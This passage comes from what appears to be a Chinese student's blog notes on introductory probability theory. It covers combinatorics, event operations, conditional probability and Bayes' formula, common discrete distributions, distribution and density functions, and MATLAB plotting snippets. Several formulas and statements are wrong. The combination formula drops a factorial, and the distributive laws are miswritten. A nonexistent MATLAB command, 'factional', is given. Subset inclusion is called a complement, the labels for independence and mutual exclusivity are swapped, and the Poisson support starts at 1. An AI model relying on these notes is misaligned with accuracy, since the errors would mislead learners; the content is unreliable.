<ol type="1">
<li><span class="math inline">\(0\le f_n(A)\le 1\)</span></li>
<li><span class="math inline">\(f_n(S)=1\)</span></li>
<li>若 <span class="math inline">\(A_1,A_2,\cdots
A_k\)</span>是两两不相容的事件,则 <span
class="math inline">\(f_n(A_1\bigcup A_2\bigcup \cdots \bigcup
A_k)=f_n(A_1)+f_n(A_2)+\cdots +f_n(A_k)\)</span></li>
</ol></li>
</ol>
<hr />
<h2 id="排列组合数">排列组合数</h2>
<p>组合数：</p>
<p><span
class="math inline">\(C_n^m=\frac{n!}{m!(n-m)}=\frac{n(n-1)\cdots
(n-m+1)}{m!}\)</span></p>
<p>组合数 <span class="math inline">\(C_n^m\)</span>也记为 <span
class="math inline">\(\tbinom{n}{m}\)</span></p>
<p>排列数：</p>
<p><span class="math inline">\(A_n^m=C_n^m\cdot m!=n(n-1)\cdots
(n-m+1)\)</span></p>
<p>排列数 <span class="math inline">\(A_n^m\)</span>也记为 <span
class="math inline">\(P_n^m\)</span></p>
<hr />
<h2
id="matlab求阶乘以及排列组合数的命令">matlab求阶乘以及排列组合数的命令</h2>
<ol type="1">
<li><span
class="math inline">\(n!\)</span>：<code>factional(n)</code>或<code>prod(1:n)</code></li>
<li><span
class="math inline">\(C_n^k\)</span>：<code>nchoosek(n,k)</code></li>
<li><span
class="math inline">\(A_n^k\)</span>：<code>factional(n)/factional(n-k)</code></li>
</ol>
<section id="footnotes" class="footnotes footnotes-end-of-document"
role="doc-endnotes">
<hr />
<ol>
<li id="fn1"><p>实际推断原理/小概率事件原理<a href="#fnref1"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>概率论期中作业</title>
    <url>/%E6%A6%82%E7%8E%87%E8%AE%BA%E6%9C%9F%E4%B8%AD%E4%BD%9C%E4%B8%9A/</url>
    <content><![CDATA[<a href="/%E6%A6%82%E7%8E%87%E8%AE%BA%E6%9C%9F%E4%B8%AD%E4%BD%9C%E4%B8%9A/%E6%A6%82%E7%8E%87%E8%AE%BA%E6%9C%9F%E4%B8%AD%E4%BD%9C%E4%B8%9A.pdf" title="概率论期中作业.pdf文档下载">概率论期中作业.pdf文档下载</a>
<span id="more"></span>
<h2
id="第一章随机事件与概率知识点总结">第一章:随机事件与概率知识点总结</h2>
<p>随机试验<span
class="math inline">\(E\)</span>的所有可能结果组成的集合称为<span
class="math inline">\(E\)</span>的<strong>样本空间</strong>,记为<span
class="math inline">\(S\)</span>.样本空间的元素,样本空间的元素,即试验<span
class="math inline">\(E\)</span>的每一个结果,称为<strong>样本点</strong></p>
<p>随机试验<span class="math inline">\(E\)</span>的样本空间<span
class="math inline">\(S\)</span>的子集称为<span
class="math inline">\(E\)</span>的 <strong>随机事件</strong>,简称
<strong>事件</strong></p>
<h3 id="和事件积事件运算性质">和事件积事件运算性质</h3>
<p><span class="math display">\[
A\bigcup A=A,A\bigcup S=S,A\bigcup \emptyset=A\\
A\bigcap A=A,A\bigcap S=A,A\bigcap \emptyset=\emptyset
\]</span></p>
<h3 id="事件间的运算规律">事件间的运算规律</h3>
<ol type="1">
<li><strong>交换律</strong> <span class="math inline">\(A\bigcup
B=B\bigcup A;A\bigcap B=B\bigcap A\)</span></li>
<li><strong>结合律</strong> <span
class="math inline">\(A\bigcup(B\bigcup C)=(A \bigcup B)\bigcup
C;A\bigcap(B\bigcap C)=(A \bigcap B)\bigcap C\)</span></li>
<li><strong>分配律</strong> <span
class="math inline">\(A\bigcup(B\bigcap C)=(A \bigcap B)\bigcup(A\bigcap
C);A\bigcap(B\bigcup C)=(A \bigcup B)\bigcap(A\bigcup C)\)</span></li>
<li><strong>德<span class="math inline">\(\cdot\)</span>摩根律</strong>
<span class="math inline">\(\overline{A\bigcup B}=\bar{A}\bigcap
\bar{B};\overline{A\bigcap B}=\bar{A}\bigcup\bar{B}\)</span></li>
</ol>
<h3 id="概率论与集合论之间的对应关系">概率论与集合论之间的对应关系</h3>
<table>
<colgroup>
<col style="width: 20%" />
<col style="width: 36%" />
<col style="width: 43%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">记号</th>
<th style="text-align: center;">概率论</th>
<th style="text-align: center;">集合论</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><span
class="math inline">\(S\)</span></td>
<td style="text-align: center;">样本空间,必然事件</td>
<td style="text-align: center;">全间</td>
</tr>
<tr class="even">
<td style="text-align: center;">$$</td>
<td style="text-align: center;">不可能事件</td>
<td style="text-align: center;">空集</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span
class="math inline">\(e\)</span></td>
<td style="text-align: center;">可能的结果</td>
<td style="text-align: center;">元素</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span
class="math inline">\(A\)</span></td>
<td style="text-align: center;">随机事件</td>
<td style="text-align: center;">子集</td>
</tr>
<tr class="odd">
<td style="text-align: center;">${A} $</td>
<td style="text-align: center;"><span
class="math inline">\(A\)</span>的对立事件</td>
<td style="text-align: center;"><span
class="math inline">\(A\)</span>的补集</td>
</tr>
<tr class="even">
<td style="text-align: center;">$AB $</td>
<td style="text-align: center;"><span
class="math inline">\(A\)</span>出现必然导致 <span
class="math inline">\(B\)</span>出现</td>
<td style="text-align: center;"><span class="math inline">\(A\)</span>是
<span class="math inline">\(B\)</span>的补集</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span
class="math inline">\(A=B\)</span></td>
<td style="text-align: center;">事件 <span
class="math inline">\(A\)</span>与事件 <span
class="math inline">\(B\)</span>相等</td>
<td style="text-align: center;">集合 <span
class="math inline">\(A\)</span>与集合 <span
class="math inline">\(B\)</span>相等</td>
</tr>
<tr class="even">
<td style="text-align: center;">$AB $</td>
<td style="text-align: center;">事件 <span
class="math inline">\(A\)</span>与事件B的和事件</td>
<td style="text-align: center;">集合 <span
class="math inline">\(A\)</span>与集合 <span
class="math inline">\(B\)</span>的并集</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span
class="math inline">\(AB\)</span></td>
<td style="text-align: center;">事件 <span
class="math inline">\(A\)</span>与事件 <span
class="math inline">\(B\)</span>的积事件</td>
<td style="text-align: center;">集合 <span
class="math inline">\(A\)</span>与结婚 <span
class="math inline">\(B\)</span>的交集</td>
</tr>
<tr class="even">
<td style="text-align: center;">$A-B $</td>
<td style="text-align: center;">事件 <span
class="math inline">\(A\)</span>与事件 <span
class="math inline">\(B\)</span>的差事件</td>
<td style="text-align: center;">集合 <span
class="math inline">\(A\)</span>与集合 <span
class="math inline">\(B\)</span>的差集</td>
</tr>
<tr class="odd">
<td style="text-align: center;">$AB=$</td>
<td style="text-align: center;">事件 <span
class="math inline">\(A\)</span>与 <span
class="math inline">\(B\)</span>互不相容</td>
<td style="text-align: center;"><span class="math inline">\(A\)</span>与
<span class="math inline">\(B\)</span>两集合中没有相同的元素</td>
</tr>
</tbody>
</table>
<h3 id="概率的性质">概率的性质</h3>
<ul>
<li>性质1
<ul>
<li><span class="math inline">\(P(\emptyset)=0\)</span></li>
</ul></li>
<li>性质2
<ul>
<li>有限可加性,在无交的时候才可以用</li>
<li><span
class="math inline">\(P(A)=P(A-B)+P(AB)\)</span>前提条件是<span
class="math inline">\(P(A-B)\bigcap P(AB)=\emptyset\)</span></li>
</ul></li>
<li>性质3
<ul>
<li>减法公式
<ul>
<li>设 <span class="math inline">\(A,B\)</span>是两个事件,若 <span
class="math inline">\(A\subset B\)</span>,则有
<ul>
<li><span class="math inline">\(P(B-A)=P(B)-P(A)\)</span></li>
<li><span class="math inline">\(P(B)\ge P(A)\)</span></li>
<li><span class="math inline">\(B-A=B-AB=B\bar{A}\)</span>
无论何时都会成立</li>
</ul></li>
</ul></li>
</ul></li>
<li>性质4
<ul>
<li>对于任一事件 <span class="math inline">\(A\)</span>,<span
class="math inline">\(P(A)\le1\)</span></li>
</ul></li>
<li>性质5
<ul>
<li>逆事件的概率
<ul>
<li>对于任一事件 <span class="math inline">\(A\)</span>,有 <span
class="math inline">\(P(\bar{A})=1-P(A)\)</span></li>
</ul></li>
</ul></li>
<li>性质6
<ul>
<li>加法公式
<ul>
<li>对于任意两事件 <span class="math inline">\(A\)</span>,<span
class="math inline">\(B\)</span>.有 <span
class="math inline">\(P(A\bigcup B)=P(A)+P(B)-P(AB)\)</span></li>
<li>为什么要减去?因为<span
class="math inline">\(P(AB)\)</span>是多加的部分,它多加了一遍,所以要减去</li>
</ul></li>
<li>推广-多个事件的和事件
<ul>
<li>先是单个事件概率相加,减去两两事件发生概率,加上三个事件和事件发生概率,减去四个事件和事件发生概率直到n个事件</li>
</ul></li>
</ul></li>
</ul>
<h4 id="典型习题">典型习题</h4>
<h3 id="古典概型计算公式">古典概型计算公式</h3>
<p><span class="math display">\[
P(A)=\frac{k}{n}=\frac{A的基本事件数}{S的基本事件的总数}=\frac{N(A)}{N(S)}
\]</span></p>
<h3 id="几何概型">几何概型</h3>
<p>当随机试验的样本空间是某个区域 <span
class="math inline">\(S\)</span>,并且任意一点落在测度(长度、面积、体积)相同的子区域
<span class="math inline">\(A\)</span>是等可能的,而与 <span
class="math inline">\(A\)</span>的位置和形状无关.</p>
<p>则事件 <span class="math inline">\(A\)</span>的概率可定义为: <span
class="math display">\[
P(A)=\frac{mA}{mS}
\]</span> <em>其中 <span
class="math inline">\(mS\)</span>是样本空间的测度,<span
class="math inline">\(mA\)</span>是构成事件 <span
class="math inline">\(A\)</span>的子区域的测度.</em>这养借助于集合上的测度来合理规定概率称为<strong>几何概型</strong></p>
<h3 id="小复习">小复习</h3>
<h4 id="排列组合数">排列组合数</h4>
<p>组合数：</p>
<p><span
class="math inline">\(C_n^m=\frac{n!}{m!(n-m)}=\frac{n(n-1)\cdots
(n-m+1)}{m!}\)</span></p>
<p>组合数 <span class="math inline">\(C_n^m\)</span>也记为 <span
class="math inline">\(\tbinom{n}{m}\)</span></p>
<p>排列数：</p>
<p><span class="math inline">\(A_n^m=C_n^m\cdot m!=n(n-1)\cdots
(n-m+1)\)</span></p>
<p>排列数 <span class="math inline">\(A_n^m\)</span>也记为 <span
class="math inline">\(P_n^m\)</span></p>
<h3
id="matlab求阶乘以及排列组合数的命令">matlab求阶乘以及排列组合数的命令</h3>
<ol type="1">
<li><span
class="math inline">\(n!\)</span>：<code>factional(n)</code>或<code>prod(1:n)</code></li>
<li><span
class="math inline">\(C_n^k\)</span>：<code>nchoosek(n,k)</code></li>
<li><span
class="math inline">\(A_n^k\)</span>：<code>factional(n)/factional(n-k)</code></li>
</ol>
<h3 id="条件概率公式">条件概率公式</h3>
<h4 id="定义-已知原因找结果">定义-已知原因找结果</h4>
<p>设 <span class="math inline">\(A\)</span>,<span
class="math inline">\(B\)</span>是两个事件,且 <span
class="math inline">\(P(A)&gt;0\)</span>,称<span
class="math inline">\(P(B|A)=\frac{P(AB)}{P(A)}\)</span>为在事件 <span
class="math inline">\(A\)</span>发生的条件下事件 <span
class="math inline">\(B\)</span>发生的条件概率</p>
<p>同理可得</p>
<p><span class="math inline">\(P(A|B)=\frac{P(AB)}{P(B)}\)</span>为事件
<span class="math inline">\(B\)</span>发生的条件下 <span
class="math inline">\(A\)</span>发生的概率</p>
<h4 id="乘法定理">乘法定理</h4>
<p>设 <span class="math inline">\(A\)</span>,<span
class="math inline">\(B\)</span>是两个事件,且 <span
class="math inline">\(P(A)&gt;0\)</span>,则 <span
class="math display">\[
P(B|A)=\frac{P(AB)}{P(A)} \longrightarrow P(AB)=P(A|B)P(A)
\]</span> 由此的到下面乘法定理:</p>
<p>设 <span class="math inline">\(P(A)&gt;0\)</span>,则有<span
class="math inline">\(P(AB)=P(B|A)P(A)\)</span><strong>乘法公式</strong></p>
<h5 id="推广">推广</h5>
<p>设 <span class="math inline">\(A,B,C\)</span>为事件,且 <span
class="math inline">\(P(AB)&gt;0\)</span>,则有<span
class="math inline">\(P(ABC)=P(C|AB)P(B|A)P(A)\)</span></p>
<h3 id="全概率公式">全概率公式</h3>
<p>设试验 <span class="math inline">\(E\)</span>的样本空间为 <span
class="math inline">\(S\)</span>,<span
class="math inline">\(A\)</span>为 <span
class="math inline">\(E\)</span>的事件, <span
class="math inline">\(B_1,B_2,\cdots ,B_n\)</span>为 <span
class="math inline">\(S\)</span>的一个划分,且 <span
class="math inline">\(P(B_i)&gt;0(i=1,2,\cdots n)\)</span>则 <span
class="math display">\[
P(A)=P(AB_1)+P(AB_2)+\cdots+P(AB_n) //概率的有限可加性\\
=P(A|B_1)P(B_1)+P(A|B_2)P(B_2)+\cdots +P(A|B_n)P(B_n)//乘法定理\\
=\sum\limits_{i=1}^nP(A|Bn)P(B_n)//简洁表示法
\]</span> 上式称为 全概率公式</p>
<p>化整为零——各个击破——合而为一</p>
<h3 id="贝叶斯公式">贝叶斯公式</h3>
<h4 id="定义-已知结果找原因">定义-已知结果找原因</h4>
<p>设试验 <span class="math inline">\(E\)</span>的样本空间为 <span
class="math inline">\(S\)</span>. <span
class="math inline">\(A\)</span>为 <span
class="math inline">\(E\)</span>的时间.<span
class="math inline">\(B_1,B_2,\cdots,B_n\)</span>为 <span
class="math inline">\(S\)</span>的一个划分,且 <span
class="math inline">\(P(A)&gt;0,P(B_1)&gt;0\
(i=1,2,\cdots,n)\)</span>,则 <span class="math display">\[
P(B_i|A)=\frac{P(A|B_i)P(B_i)}{\sum\limits_{j-1}^nP(A|B_j)P(B_j)}
\]</span> 上式称为 贝叶斯公式</p>
<h3 id="关系">关系</h3>
<p><span class="math display">\[
{\color{red}条件概率}{\color{blue}P(B|A)=\frac{P(AB)}{P(A)}}\longrightarrow
{\color{red}乘法定理}{\color{blue}P(AB)=P(B|A)P(A)} \\
\downarrow \\
{\color{red}全概率公式} \\
{\color{blue}P(A)=P(A|B_1)P(B_1)+P(A|B_2)P(B_2)+\cdots +P(A|B_n)P(B_n)}
\\
\downarrow\\
{\color{red}贝叶斯公式} \\
{\color{blue}P(B_i|A)=\frac{P(A|B_i)P(B_i)}{\sum\limits_{j-1}^nP(A|B_j)P(B_j)},i=1,2,\cdots,n}
\]</span></p>
<h3 id="事件相互独立的概念">事件相互独立的概念</h3>
<p>设 <span
class="math inline">\(A,B,C\)</span>是三个事件,如果满足不等式 <span
class="math display">\[
\begin{cases}
P(AB)=P(A)P(B)\\
P(BC)=P(B)P(C)\\
P(AC)=P(A)P(C)\\
P(ABC)=P(A)P(B)P(C)
\end{cases}
\]</span> <span class="math inline">\(A,B,C\)</span>两两相互独立</p>
<p>则称事件 <span class="math inline">\(A,B,C\)</span>相互独立 <span
class="math display">\[
\begin{cases}
P(AB)=P(A)P(B)\ \ \ 两事件互斥 \\
AB=\emptyset\ \ \ 两事件相互独立
\end{cases}
\}{\color{red}两者之间没有必然联系}
\]</span> 往往通过实际加以判断</p>
<h4 id="定理">定理</h4>
<ul>
<li>定理一
<ul>
<li>设 <span class="math inline">\(A,B\)</span>是两事件,且 <span
class="math inline">\(P(A)&gt;0\)</span>,若 <span
class="math inline">\(A,B\)</span>相互独立,则 <span
class="math inline">\(P(B|A)=P(B)\)</span>.反之亦然</li>
</ul></li>
<li>定理二
<ul>
<li>必然事件 <span class="math inline">\(S\)</span>与任意随机事件 <span
class="math inline">\(A\)</span>相互独立;不可能事件与任意随机事件 <span
class="math inline">\(A\)</span>相互独立</li>
</ul></li>
<li>定理三-经常用到
<ul>
<li>若事件 <span class="math inline">\(A\)</span>与 <span
class="math inline">\(B\)</span>相互独立,则下列各事件也相互独立
<ul>
<li><span
class="math inline">\(A与\bar{B},\bar{A}与B,\bar{A}与\bar{B}\)</span></li>
<li>推论
<ul>
<li><span
class="math inline">\(n(n\ge2)\)</span>个事件相互独立,则其中任意 <span
class="math inline">\(k(2\ge k\ge n)\)</span>个事件也是相互独立的</li>
<li><span
class="math inline">\(n(n\ge2)\)</span>个事件相互独立,将其中任意多个事件换成与之对立的事件所得的<span
class="math inline">\(n\)</span>个事件仍相互独立</li>
</ul></li>
</ul></li>
</ul></li>
</ul>
<h3 id="伯努利概型">伯努利概型</h3>
<p>一般把只有两种可能结果 <span class="math inline">\(A\)</span>和 <span
class="math inline">\(\bar{A}\)</span>的试验,称之为<strong>伯努利试验</strong>或称<strong>伯努利概型</strong></p>
<p>把试验 <span class="math inline">\(E\)</span>重复 <span
class="math inline">\(n\)</span>次,且 <span
class="math inline">\(n\)</span>次试验互不影响,则称为 <strong><span
class="math inline">\(n\)</span>重伯努利试验</strong></p>
<h4 id="定理-1">定理</h4>
<ul>
<li>定理1
<ul>
<li>每次试验中,事件 <span class="math inline">\(A\)</span>发生的概率为
<span class="math inline">\(p(0&lt;p&lt;1)\)</span>,则在 <span
class="math inline">\(n\)</span>重伯努利试验中,事件 <span
class="math inline">\(A\)</span>发生 <span
class="math inline">\(k\)</span>次的概率为 <span
class="math inline">\(P_n(k)=C_n^kp^k(1-p)^{n-k},k=1,2,\cdots
,n\)</span></li>
</ul></li>
</ul>
<h3 id="随机变量">随机变量</h3>
<p>把随机变量理解为一个函数,对应法则 <span class="math display">\[
r.v.(random\ variable)
\begin{cases}
离散型\\
连续型\\
混合型
\end{cases}
\]</span></p>
<h3 id="离散型随机变量的分布律">离散型随机变量的分布律</h3>
<p>设离散型随机变量 <span
class="math inline">\(X\)</span>所有可能取的值为 <span
class="math inline">\(x_k(k=1,2,\cdots)\)</span>, <span
class="math inline">\(X\)</span>取各个可能值的概率,即事件 <span
class="math inline">\({X=x_k}\)</span>的概率为 <span
class="math display">\[
P(X=x_k)=p_k\ k=1,2,\cdots
\]</span> ,称此为离散型随机变量的分布律</p>
<h4 id="说明由概率的定义p_k满足如下两个条件">说明:由概率的定义,<span
class="math inline">\(p_k\)</span>满足如下两个条件:</h4>
<ol type="1">
<li><span class="math inline">\(p_k\ge0,k=1,2,\cdots\)</span>
<strong>非负性</strong></li>
<li><span class="math inline">\(\sum\limits_{k=1}^\infty=1\)</span>
<strong>规范性</strong></li>
</ol>
<h4 id="表格法">表格法</h4>
<table>
<thead>
<tr class="header">
<th style="text-align: center;"><span
class="math inline">\(X\)</span></th>
<th style="text-align: center;"><span
class="math inline">\(x_1\)</span></th>
<th style="text-align: center;"><span
class="math inline">\(x_2\)</span></th>
<th style="text-align: center;"><span
class="math inline">\(\cdots\)</span></th>
<th style="text-align: center;"><span
class="math inline">\(x_n\)</span></th>
<th style="text-align: center;"><span
class="math inline">\(\cdots\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><span
class="math inline">\(p_k\)</span></td>
<td style="text-align: center;"><span
class="math inline">\(p_1\)</span></td>
<td style="text-align: center;"><span
class="math inline">\(p_2\)</span></td>
<td style="text-align: center;"><span
class="math inline">\(\cdots\)</span></td>
<td style="text-align: center;"><span
class="math inline">\(p_n\)</span></td>
<td style="text-align: center;"><span
class="math inline">\(\cdots\)</span></td>
</tr>
</tbody>
</table>
<h3 id="常见的离散型变量的概率分布">常见的离散型变量的概率分布</h3>
<ol type="1">
<li><p><span class="math inline">\((0-1)\)</span>分布</p>
<ol type="1">
<li><p>公式法</p>
<ol type="1">
<li><span class="math inline">\(P\{X=k\}=p^k(1-p)^{1-k},k=0,1\
(0&lt;p&lt;1)\)</span></li>
</ol></li>
<li><p>表格法</p>
<ol type="1">
<li><table>
<thead>
<tr class="header">
<th><span class="math inline">\(X\)</span></th>
<th>0</th>
<th>1</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><span class="math inline">\(p_k\)</span></td>
<td><span class="math inline">\(1-p\)</span></td>
<td><span class="math inline">\(p\)</span></td>
</tr>
</tbody>
</table></li>
</ol></li>
</ol></li>
<li><p>伯努利试验、二项分布</p>
<ol type="1">
<li>伯努利试验
<ol type="1">
<li>和上面的伯努利试验描述一致</li>
</ol></li>
<li>二项分布
<ol type="1">
<li><span
class="math inline">\(P\{X=k\}=C_n^kp^k(1-p)^{n-k},k=0,1,\cdots,n\)</span></li>
<li>这样的分布为二项分布,记为 <span class="math inline">\(X\sim
b(n,p)\)</span></li>
<li>二项分布 <span
class="math inline">\(\stackrel{n=1}\longrightarrow\)</span>两点分布(b(1,p)也叫01分布)</li>
</ol></li>
</ol></li>
<li><p>泊松分布</p>
<ol type="1">
<li>设随机变量 <span class="math inline">\(X\)</span>所有可能的值为
<span
class="math inline">\(0,1,2,\cdots\)</span>,而取各个值的概率为</li>
<li><span
class="math inline">\(P\{X=k\}=\frac{\lambda^ke^{-\lambda}}{k!},k=1,2,\cdots\)</span>,其中
<span class="math inline">\(\lambda&gt;0\)</span>是常数.则称 <span
class="math inline">\(X\)</span>服从参数为 <span
class="math inline">\(\lambda\)</span>的泊松分布</li>
<li>记为 <span class="math inline">\(X\sim \pi(\lambda)\)</span></li>
<li>二项分布 <span class="math inline">\(\stackrel{np\rightarrow
\lambda(n\rightarrow+\infty)}\longrightarrow\)</span> 泊松分布</li>
<li><strong>泊松定理</strong>
<ol type="1">
<li>设 <span class="math inline">\(\lambda&gt;0\)</span>是一个常数,
<span class="math inline">\(n\)</span>是任意正整数,设<span
class="math inline">\(np_n=\lambda\)</span>,则对于任一固定的非负整数
<span class="math inline">\(k\)</span>有 <span
class="math inline">\(\mathop{lim}\limits_{0\rightarrow\infty}C_n^kp_n^k(1-p_n)^{n-k}=\frac{\lambda^ke^{-\lambda}}{k!}\)</span></li>
<li>一般,当 <span class="math inline">\(n\ge20\)</span>,且 <span
class="math inline">\(p\le0.05\)</span>时,使用泊松定理计算近似值颇佳</li>
</ol></li>
</ol></li>
<li><p>超几何分布</p>
<ol type="1">
<li><p>若随机变量 <span
class="math inline">\(X\)</span>的分布律为</p></li>
<li><p><span class="math display">\[
P\{X=k\}=\frac{C_M^kC_{N-M}^{n-k}}{C_N^n},k=0,1,\cdots,min{n,M}
\]</span></p></li>
<li><p>其中 <span class="math inline">\(n,M\)</span>为非负整数且满足:
<span class="math inline">\(0\le n\le N,0\le M\le N\)</span>,则称 <span
class="math inline">\(X\)</span>满足超几何分布</p></li>
<li><p>用于表示从已知的概率中求事件达成的概率</p></li>
<li><p>与二次分布的关系</p>
<ol type="1">
<li><p>若 <span class="math inline">\(\mathop{lim}\limits_{N\rightarrow
\infty}\frac{M}{N}=p\)</span>即在无限多个产品中,废品率为 <span
class="math inline">\(p\)</span>,则有</p></li>
<li><p><span class="math display">\[
\mathop{lim}\limits_{N\rightarrow\infty}\frac{C_M^kC_{N-M}^{n-k}}{C_N^n}=C_n^kp^k(1-p)^{n-k}
\]</span></p></li>
</ol></li>
</ol></li>
<li><p>几何分布</p>
<ol type="1">
<li><p>进行重复的、独立的伯努利试验,设每次试验的成功的概率为 <span
class="math inline">\(p\)</span>,讲实验已知进行到出现<strong>一次</strong>成功为止</p></li>
<li><p>若随机变量 <span
class="math inline">\(X\)</span>表示所需要的试验次数,则其分布律为</p></li>
<li><p><span class="math display">\[
P\{X=k\}=q^{k-1}p,k=1,2,\cdots,其中q=1-p
\]</span></p></li>
<li><p>则称 <span class="math inline">\(X\)</span>服从参数为 <span
class="math inline">\(p\)</span>的几何分布,记为 <span
class="math inline">\(X\sim G(p)\)</span></p></li>
</ol></li>
<li><p>帕斯卡分布</p>
<ol type="1">
<li><p>与几何分布类似,但是要达成出现<strong>r次</strong>成功才能停止(r为常数)</p></li>
<li><p>随机变量 <span
class="math inline">\(X\)</span>表示所需要的试验次数,则其分布律为</p></li>
<li><p><span class="math display">\[
P\{X=k\}=C_{k-1}^{r-1}\cdot p^{r-1}\cdot q^{k-r}\cdot
p,k=r,r+1,\cdots,其中q=1-p
\]</span></p></li>
<li><p>则称 <span
class="math inline">\(X\)</span>服从帕斯卡分布</p></li>
</ol></li>
</ol>
<h4 id="matlab代码示例">matlab代码示例</h4>
<h5 id="二项分布">二项分布</h5>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">n=<span class="number">20</span>;</span><br><span class="line">x=<span class="number">0</span>:n;</span><br><span class="line">p=<span class="number">0.5</span>;</span><br><span class="line">y=binopdf(x,n,p);</span><br><span class="line"><span class="built_in">figure</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">plot</span>(x,y,<span class="string">&#x27;ro-&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="泊松分布">泊松分布</h5>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">x=<span class="number">0</span>:<span class="number">15</span>;</span><br><span class="line">y=poisspdf(x,<span class="number">6</span>);</span><br><span class="line"><span class="built_in">figure</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">plot</span>(x,y,<span class="string">&#x27;ro-&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h6 id="nprightarrowlambda泊松近似二项分布"><span
class="math inline">\(np\rightarrow\lambda\)</span>泊松近似二项分布</h6>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y1=poisspdf(x,2);</span><br><span class="line">y2=binopdf(x,10,0.2);</span><br><span class="line">plot(x,y1,&#x27;ro-&#x27;,x,y2,&#x27;bo-&#x27;);</span><br></pre></td></tr></table></figure>
<h3 id="分布函数">分布函数</h3>
<h4 id="定义">定义</h4>
<p>设 <span class="math inline">\(X\)</span>是一个随机变量, <span
class="math inline">\(x\)</span>是任意实数函数 <span
class="math display">\[
F(x)=P\{X\le x\},-\infty&lt;x&lt;infty
\]</span> 称为 <span class="math inline">\(X\)</span>的分布函数</p>
<h5 id="说明">说明</h5>
<ol type="1">
<li>分布函数组要研究随机变量在区间内取值的概率情况</li>
<li>分布函数 <span class="math inline">\(F(x)\)</span>是 <span
class="math inline">\(x\)</span>的一个普通实函数</li>
<li>离散型随机变量图像为阶梯状</li>
<li>连续型随机变量图像是连续的</li>
</ol>
<h4 id="性质">性质</h4>
<ol type="1">
<li><p><span
class="math inline">\(F(x)\)</span>是一个<strong>单调不减函数</strong></p>
<ol type="1">
<li><p>对任意实数 <span
class="math inline">\(x_1,x_2(x_1&lt;x_2)\)</span>,有</p></li>
<li><p><span class="math display">\[
F(x_2)-F(x_1)=P\{x_1&lt;X\le x_2\}\ge 0
\]</span></p></li>
</ol></li>
<li><p><span class="math inline">\(0\le F(x)\le1\)</span>且</p>
<ol type="1">
<li><span class="math display">\[
F(-\infty)=\mathop{lim}_{x\rightarrow -\infty}F(x)=0\\
F(\infty)=\mathop{lim}_{x\rightarrow \infty}F(x)=1
\]</span></li>
</ol></li>
<li><p><span class="math inline">\(F(x+0)=F(x)\)</span>,即 <span
class="math inline">\(F(x)\)</span>是右连续的</p></li>
</ol>
<h4 id="重要公式">重要公式</h4>
<ol type="1">
<li><span class="math inline">\(P\{a&lt;X\le b\}=F(b)-F(a)\)</span></li>
<li><span class="math inline">\(P\{X&gt;a\}=1-F(a)\)</span></li>
</ol>
<p>设离散随机变量 <span class="math inline">\(X\)</span>的分布律为 <span
class="math display">\[
P\{X=x_k\}=p_k,k=1,2,\cdots
\]</span> 由概率的可列可加性得 <span
class="math inline">\(X\)</span>的分布函数为 <span
class="math display">\[
F(x)=P\{X\le x\}=\sum_{x_k\le x}P\{X=x_k\},\\即\\F(x)=\sum_{x_k\le x}p_k
\]</span> 这里的和式是对所有满足 <span class="math inline">\(x_k\le
x\)</span>的 <span class="math inline">\(k\)</span>的求和的.分布函数
<span class="math inline">\(F(x)\)</span>在 <span
class="math inline">\(x=x_k(k=1,2,\cdots)\)</span>处有跳跃,其跳跃值为
<span class="math inline">\(p_k=P\{X=x_k\}\)</span></p>
<h3 id="连续型随机变量及其概率密度">连续型随机变量及其概率密度</h3>
<h4 id="概率密度函数的定义">概率密度函数的定义</h4>
<p>如果对于随机变量 <span class="math inline">\(X\)</span>的分布函数
<span class="math inline">\(F(x)\)</span>,存在非负可积函数 <span
class="math inline">\(f(x)\)</span>,使对于任意实数 <span
class="math inline">\(x\)</span>有 <span class="math display">\[
F(x)=\int_{-\infty}^xf(t)dt
\]</span> 则称 <span
class="math inline">\(X\)</span>为连续型随机变量,其中函数 <span
class="math inline">\(f(x)\)</span>称为 <span
class="math inline">\(X\)</span>的<strong>概率密度函数</strong>,简称<strong>概率密度</strong></p>
<p>连续型随机变量的分布函数是连续函数,概率密度未必是连续的</p>
<h4 id="性质-1">性质</h4>
<ol type="1">
<li><span class="math inline">\(f(x)\ge 0\)</span> 非负性</li>
<li><span class="math inline">\(\int_{-\infty}^{\infty}f(x)dx=1\)</span>
规范性</li>
<li>对于任意实数 <span
class="math inline">\(x_1,x_2(x_1&lt;x_2)\)</span>,<span
class="math inline">\(P\{x_1&lt;X\le
x_2\}=F(x_2)-F(x_1)=\int_{x_1}^{x_2}f(x)dx\)</span>
转化成积分进行解题</li>
<li>若 <span class="math inline">\(f(x)\)</span>在点 <span
class="math inline">\(x\)</span>处连续,则有 <span
class="math inline">\(F&#39;(x)=f(x)\)</span></li>
</ol>
<p><span class="math inline">\(P\{X\le
a\}=F(a)=\int_{-\infty}^af(x)dx\)</span></p>
<p><span class="math inline">\(P\{X&gt;a\}=1-P{X\le
a}=1-F(a)=\int_a^{\infty}f(x)dx\)</span></p>
<h4 id="注意">注意</h4>
<p>对于任意指定值 <span
class="math inline">\(a\)</span>,连续型随机变量取 <span
class="math inline">\(a\)</span>的概率等于0,即 <span
class="math inline">\(P\{X=a\}=\mathop{lim}\limits_{\Delta
x\rightarrow0}\int_a^{a+\Delta x}f(x)dx=0\)</span>由此得出:</p>
<p>连续型随机变量取值落在某区间的概率与端点无关</p>
<ul>
<li>连续型随机变量
<ul>
<li>若 <span class="math inline">\(P\{X=a\}=0\)</span>则不能决定<span
class="math inline">\({X=a}\)</span>是不可能事件</li>
</ul></li>
<li>离散型随机变量
<ul>
<li><span class="math inline">\(\{X=a\}\)</span>是不可能事件 <span
